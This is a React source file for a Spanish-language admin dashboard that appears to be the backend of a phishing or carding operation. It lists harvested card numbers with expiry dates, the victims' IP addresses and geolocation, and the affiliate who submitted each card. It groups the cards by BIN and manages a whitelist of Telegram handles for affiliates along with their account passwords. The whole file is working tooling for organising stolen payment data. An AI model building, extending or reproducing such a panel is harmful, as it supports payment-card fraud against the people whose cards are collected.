import { useState, useEffect, useMemo } from 'react';
import { Link } from 'react-router-dom';
import { getCards, getRegisteredUsers, adminUpdateUserPassword, getTelegramUsernames } from '../../services/api';
import { useAuth } from '../../context/AuthContext';
import '../../styles/Dashboard.css';

interface CardRecord {
    id: number;
    cardNumber: string;
    expiry: string | null;
    ipAddress: string | null;
    ipInfo: Record<string, string> | null;
    submittedBy: string | null;
    createdAt: string;
}

interface UserRecord {
    id: number;
    username: string;
    telegramUser: string;
    ipAddress: string | null;
    profilePicture: string | null;
    createdAt: string;
}

interface TelegramUsed {
    telegramUser: string;
    username: string;
}

type Tab = 'cards' | 'users' | 'telegram';

export default function Dashboard() {
    const { token, logout } = useAuth();
    const [tab, setTab] = useState<Tab>('cards');
    const [cards, setCards] = useState<CardRecord[]>([]);
    const [users, setUsers] = useState<UserRecord[]>([]);
    const [loading, setLoading] = useState(true);
    const [search, setSearch] = useState('');

    // Card user filter
    const [userFilter, setUserFilter] = useState('');

    // Telegram usernames
    const [tgAvailable, setTgAvailable] = useState<string[]>([]);
    const [tgUsed, setTgUsed] = useState<TelegramUsed[]>([]);

    // Password editing
    const [editingUserId, setEditingUserId] = useState<number | null>(null);
    const [newPw, setNewPw] = useState('');
    const [pwMsg, setPwMsg] = useState('');

    useEffect(() => {
        if (!token) return;
        setLoading(true);
        Promise.all([
            getCards(token, 1, 9999).catch(() => ({ data: [] })),
            getRegisteredUsers(token).catch(() => []),
            getTelegramUsernames(token).catch(() => ({ available: [], used: [] })),
        ])
            .then(([cardsRes, usersRes, tgRes]) => {
                setCards(cardsRes.data || []);
                setUsers(Array.isArray(usersRes) ? usersRes : []);
                setTgAvailable(tgRes.available || []);
                setTgUsed(tgRes.used || []);
            })
            .catch((err) => { if (err.message === 'UNAUTHORIZED') logout(); })
            .finally(() => setLoading(false));
    }, [token, logout]);

    // Get unique submitters for filter dropdown
    const submitters = useMemo(() => {
        const set = new Set<string>();
        cards.forEach((c) => { if (c.submittedBy) set.add(c.submittedBy); });
        return Array.from(set).sort();
    }, [cards]);

    const filtered = useMemo(() => {
        let result = cards;
        if (userFilter) {
            result = result.filter((c) => c.submittedBy === userFilter);
        }
        if (search) {
            const s = search.toLowerCase();
            result = result.filter(
                (c) =>
                    c.cardNumber?.toLowerCase().includes(s) ||
                    c.ipAddress?.toLowerCase().includes(s) ||
                    c.expiry?.toLowerCase().includes(s) ||
                    c.submittedBy?.toLowerCase().includes(s),
            );
        }
        return result;
    }, [cards, search, userFilter]);

    const filteredUsers = useMemo(() => {
        if (!search) return users;
        const s = search.toLowerCase();
        return users.filter(
            (u) =>
                u.username?.toLowerCase().includes(s) ||
                u.telegramUser?.toLowerCase().includes(s) ||
                u.ipAddress?.toLowerCase().includes(s),
        );
    }, [users, search]);

    const filteredTgAvailable = useMemo(() => {
        if (!search) return tgAvailable;
        const s = search.toLowerCase();
        return tgAvailable.filter((h) => h.toLowerCase().includes(s));
    }, [tgAvailable, search]);

    const filteredTgUsed = useMemo(() => {
        if (!search) return tgUsed;
        const s = search.toLowerCase();
        return tgUsed.filter(
            (t) => t.telegramUser.toLowerCase().includes(s) || t.username.toLowerCase().includes(s),
        );
    }, [tgUsed, search]);

    const binGroups = useMemo(() => {
        const map = new Map<string, CardRecord[]>();
        filtered.forEach((c) => {
            const bin = c.cardNumber?.replace(/\s/g, '').slice(0, 6) || 'UNKNOWN';
            const group = map.get(bin) || [];
            group.push(c);
            map.set(bin, group);
        });
        return Array.from(map.entries())
            .map(([bin, items]) => ({
                bin,
                count: items.length,
                latest: items.reduce(
                    (max, c) => (c.createdAt > max ? c.createdAt : max),
                    items[0]?.createdAt || '',
                ),
            }))
            .sort((a, b) => a.bin.localeCompare(b.bin));
    }, [filtered]);

    const handleUpdatePassword = async (userId: number) => {
        if (!token || newPw.length < 8) { setPwMsg('Mínimo 8 caracteres'); return; }
        try {
            await adminUpdateUserPassword(token, userId, newPw);
            setPwMsg('Contraseña actualizada');
            setNewPw('');
            setTimeout(() => { setEditingUserId(null); setPwMsg(''); }, 1500);
        } catch { setPwMsg('Error al actualizar'); }
    };

    const getSearchPlaceholder = () => {
        if (tab === 'cards') return 'Buscar por número, IP, usuario...';
        if (tab === 'users') return 'Buscar usuario, telegram, IP...';
        return 'Buscar telegram username...';
    };

    return (
        <div className="dashboard">
            <div className="dash-header">
                <div className="dash-title">
                    <div className="icon"><i className="fas fa-terminal" /></div>
                    <div>
                        <h1>Admin Panel</h1>
                        <p>Panel de control</p>
                    </div>
                </div>
                <div className="dash-actions">
                    <div className="search-box">
                        <i className="fas fa-search" />
                        <input
                            placeholder={getSearchPlaceholder()}
                            value={search}
                            onChange={(e) => setSearch(e.target.value)}
                        />
                    </div>
                    <button className="logout-btn" onClick={logout}>
                        <i className="fas fa-sign-out-alt" /> Cerrar Sesión
                    </button>
                </div>
            </div>

            <div className="dash-tabs">
                <button className={`dash-tab${tab === 'cards' ? ' active' : ''}`} onClick={() => { setTab('cards'); setSearch(''); setUserFilter(''); }}>
                    <i className="fas fa-credit-card" /> Tarjetas
                </button>
                <button className={`dash-tab${tab === 'users' ? ' active' : ''}`} onClick={() => { setTab('users'); setSearch(''); }}>
                    <i className="fas fa-users" /> Usuarios
                </button>
                <button className={`dash-tab${tab === 'telegram' ? ' active' : ''}`} onClick={() => { setTab('telegram'); setSearch(''); }}>
                    <i className="fab fa-telegram-plane" /> Telegram Usernames
                </button>
            </div>

            {/* User filter for cards tab */}
            {tab === 'cards' && submitters.length > 0 && (
                <div className="card-user-filter">
                    <div className="filter-label">
                        <i className="fas fa-filter" /> Filtrar por usuario:
                    </div>
                    <div className="filter-options">
                        <button
                            className={`filter-chip${!userFilter ? ' active' : ''}`}
                            onClick={() => setUserFilter('')}
                        >
                            Todos
                        </button>
                        {submitters.map((u) => (
                            <button
                                key={u}
                                className={`filter-chip${userFilter === u ? ' active' : ''}`}
                                onClick={() => setUserFilter(u)}
                            >
                                <i className="fas fa-user" /> {u}
                            </button>
                        ))}
                    </div>
                </div>
            )}

            <div className="stats-row">
                {tab === 'cards' ? (
                    <>
                        <div className="stat-card">
                            <div className="label">Total Tarjetas</div>
                            <div className="value">{filtered.length}</div>
                        </div>
                        <div className="stat-card">
                            <div className="label">BINs Únicos</div>
                            <div className="value">{binGroups.length}</div>
                        </div>
                        {userFilter && (
                            <div className="stat-card">
                                <div className="label">Filtrado por</div>
                                <div className="value" style={{ fontSize: '1rem', color: '#38bdf8' }}>{userFilter}</div>
                            </div>
                        )}
                    </>
                ) : tab === 'users' ? (
                    <>
                        <div className="stat-card">
                            <div className="label">Usuarios Registrados</div>
                            <div className="value">{filteredUsers.length}</div>
                        </div>
                        <div className="stat-card">
                            <div className="label">Total Whitelist</div>
                            <div className="value">{tgAvailable.length + tgUsed.length}</div>
                        </div>
                    </>
                ) : (
                    <>
                        <div className="stat-card">
                            <div className="label">Disponibles</div>
                            <div className="value tg-available-value">{filteredTgAvailable.length}</div>
                        </div>
                        <div className="stat-card">
                            <div className="label">En Uso</div>
                            <div className="value tg-used-value">{filteredTgUsed.length}</div>
                        </div>
                        <div className="stat-card">
                            <div className="label">Total Whitelist</div>
                            <div className="value">{tgAvailable.length + tgUsed.length}</div>
                        </div>
                    </>
                )}
            </div>

            {loading ? (
                <div className="loading-state">
                    <div className="loading-spinner" />
                    <p>Cargando datos...</p>
                </div>
            ) : tab === 'cards' ? (
                binGroups.length === 0 ? (
                    <div className="empty-state">
                        <i className="fas fa-database" />
                        <p>{search || userFilter ? 'No se encontraron resultados' : 'No hay tarjetas registradas'}</p>
                    </div>
                ) : (
                    <div className="bin-groups-container">
                        {binGroups.map((g) => {
                            // Count unique submitters for this BIN group
                            const groupCards = filtered.filter(
                                (c) => (c.cardNumber?.replace(/\s/g, '').slice(0, 6) || 'UNKNOWN') === g.bin,
                            );
                            const groupSubmitters = new Set(groupCards.map((c) => c.submittedBy).filter(Boolean));

                            return (
                                <Link key={g.bin} to={`/admin/bin/${g.bin}`} className="bin-group-link">
                                    <div className="bin-group">
                                        <div className="bin-group-header">
                                            <div className="bin-group-header-left">
                                                <div className="bin-group-icon"><i className="fas fa-credit-card" /></div>
                                                <div className="bin-group-info">
                                                    <div className="bin-group-title">
                                                        BIN: <span className="bin-label">{g.bin}</span>
                                                        <span className="bin-group-badge"><i className="fas fa-layer-group" /> {g.count}</span>
                                                    </div>
                                                    <div className="bin-group-meta">
                                                        Última: {new Date(g.latest).toLocaleString()}
                                                        {groupSubmitters.size > 0 && (
                                                            <span className="bin-submitters">
                                                                {' · '}<i className="fas fa-user" /> {Array.from(groupSubmitters).join(', ')}
                                                            </span>
                                                        )}
                                                    </div>
                                                </div>
                                            </div>
                                            <div className="bin-group-arrow"><i className="fas fa-chevron-right" /></div>
                                        </div>
                                    </div>
                                </Link>
                            );
                        })}
                    </div>
                )
            ) : tab === 'users' ? (
                filteredUsers.length === 0 ? (
                    <div className="empty-state">
                        <i className="fas fa-users" />
                        <p>{search ? 'No se encontraron resultados' : 'No hay usuarios registrados'}</p>
                    </div>
                ) : (
                    <div className="users-list">
                        {filteredUsers.map((u) => (
                            <div key={u.id} className="user-row">
                                <div className="user-row-avatar">
                                    {u.profilePicture ? (
                                        <img src={u.profilePicture} alt="" />
                                    ) : (
                                        <i className="fas fa-user" />
                                    )}
                                </div>
                                <div className="user-row-info">
                                    <div className="user-row-name">{u.username}</div>
                                    <div className="user-row-meta">
                                        <span className="user-tg"><i className="fab fa-telegram-plane" /> {u.telegramUser}</span>
                                        <span className="user-ip"><i className="fas fa-globe" /> {u.ipAddress || 'N/A'}</span>
                                        <span className="user-date"><i className="fas fa-clock" /> {new Date(u.createdAt).toLocaleDateString()}</span>
                                    </div>
                                </div>
                                <div className="user-row-actions">
                                    {editingUserId === u.id ? (
                                        <div className="pw-edit-inline">
                                            <input
                                                type="password"
                                                placeholder="Nueva contraseña"
                                                value={newPw}
                                                onChange={(e) => setNewPw(e.target.value)}
                                                autoFocus
                                            />
                                            <button className="pw-save-btn" onClick={() => handleUpdatePassword(u.id)}>
                                                <i className="fas fa-check" />
                                            </button>
                                            <button className="pw-cancel-btn" onClick={() => { setEditingUserId(null); setNewPw(''); setPwMsg(''); }}>
                                                <i className="fas fa-times" />
                                            </button>
                                            {pwMsg && <span className="pw-msg">{pwMsg}</span>}
                                        </div>
                                    ) : (
                                        <button className="pw-edit-btn" onClick={() => { setEditingUserId(u.id); setNewPw(''); setPwMsg(''); }}>
                                            <i className="fas fa-key" /> Cambiar contraseña
                                        </button>
                                    )}
                                </div>
                            </div>
                        ))}
                    </div>
                )
            ) : (
                /* Telegram Usernames Tab */
                <div className="tg-section">
                    {/* Used Usernames */}
                    <div className="tg-group">
                        <div className="tg-group-header">
                            <div className="tg-group-icon used"><i className="fas fa-user-check" /></div>
                            <h3>En Uso <span className="tg-count">{filteredTgUsed.length}</span></h3>
                        </div>
                        {filteredTgUsed.length === 0 ? (
                            <div className="tg-empty">
                                <p>{search ? 'No se encontraron resultados' : 'Ningún username en uso'}</p>
                            </div>
                        ) : (
                            <div className="tg-list">
                                {filteredTgUsed.map((t) => (
                                    <div key={t.telegramUser} className="tg-item used">
                                        <div className="tg-item-icon used">
                                            <i className="fab fa-telegram-plane" />
                                        </div>
                                        <div className="tg-item-info">
                                            <div className="tg-item-handle">{t.telegramUser}</div>
                                            <div className="tg-item-user">
                                                <i className="fas fa-user" /> {t.username}
                                            </div>
                                        </div>
                                        <div className="tg-badge used">
                                            <i className="fas fa-lock" /> En uso
                                        </div>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>

                    {/* Available Usernames */}
                    <div className="tg-group">
                        <div className="tg-group-header">
                            <div className="tg-group-icon available"><i className="fas fa-user-plus" /></div>
                            <h3>Disponibles <span className="tg-count">{filteredTgAvailable.length}</span></h3>
                        </div>
                        {filteredTgAvailable.length === 0 ? (
                            <div className="tg-empty">
                                <p>{search ? 'No se encontraron resultados' : 'Todos los usernames están en uso'}</p>
                            </div>
                        ) : (
                            <div className="tg-grid">
                                {filteredTgAvailable.map((handle) => (
                                    <div key={handle} className="tg-item available">
                                        <div className="tg-item-icon available">
                                            <i className="fab fa-telegram-plane" />
                                        </div>
                                        <div className="tg-item-handle">{handle}</div>
                                        <div className="tg-badge available">
                                            <i className="fas fa-check-circle" /> Libre
                                        </div>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>
                </div>
            )}
        </div>
    );
}
